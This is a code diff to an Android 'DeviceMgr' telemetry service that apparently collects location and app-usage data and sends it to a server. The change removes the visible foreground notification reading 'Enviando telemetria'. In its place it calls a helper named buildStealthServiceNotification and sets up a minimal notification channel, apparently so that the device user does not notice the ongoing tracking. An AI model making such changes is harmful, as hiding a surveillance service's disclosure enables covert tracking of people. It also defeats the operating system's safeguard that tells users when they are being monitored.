@@ -1,8 +1,6 @@
 package com.company.devicemgr.services;
 
 import android.app.Notification;
-import android.app.NotificationChannel;
-import android.app.NotificationManager;
 import android.app.AppOpsManager;
 import android.app.Service;
 import android.app.usage.UsageStats;
@@ -36,6 +34,7 @@ import androidx.core.content.ContextCompat;
 import com.company.devicemgr.utils.ApiConfig;
 import com.company.devicemgr.utils.AppRuntime;
 import com.company.devicemgr.utils.DeviceIdentity;
+import com.company.devicemgr.utils.ForegroundNotificationHelper;
 import com.company.devicemgr.utils.HttpClient;
 import com.company.devicemgr.utils.SupportSessionApi;
 
@@ -104,20 +103,11 @@ public class ForegroundTelemetryService extends Service implements LocationListe
     public void onCreate() {
         super.onCreate();
         createNotificationChannel();
-        Notification n;
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-            n = new Notification.Builder(this, CHANNEL_ID)
-                    .setContentTitle("DeviceMgr")
-                    .setContentText("Enviando telemetria")
-                    .setSmallIcon(android.R.drawable.ic_menu_mylocation)
-                    .build();
-        } else {
-            n = new Notification.Builder(this)
-                    .setContentTitle("DeviceMgr")
-                    .setContentText("Enviando telemetria")
-                    .setSmallIcon(android.R.drawable.ic_menu_mylocation)
-                    .build();
-        }
+        Notification n = ForegroundNotificationHelper.buildStealthServiceNotification(
+                this,
+                CHANNEL_ID,
+                android.R.drawable.ic_menu_mylocation
+        );
         startForeground(1, n);
 
         locationManager = (LocationManager) getSystemService(LOCATION_SERVICE);
@@ -181,11 +171,7 @@ public class ForegroundTelemetryService extends Service implements LocationListe
     }
 
     private void createNotificationChannel() {
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-            NotificationChannel nc = new NotificationChannel(CHANNEL_ID, "DeviceMgr", NotificationManager.IMPORTANCE_LOW);
-            NotificationManager nm = (NotificationManager) getSystemService(NOTIFICATION_SERVICE);
-            if (nm != null) nm.createNotificationChannel(nc);
-        }
+        ForegroundNotificationHelper.ensureMinChannel(this, CHANNEL_ID, "DeviceMgr");
     }
 
     private boolean hasPermission(String permission) {
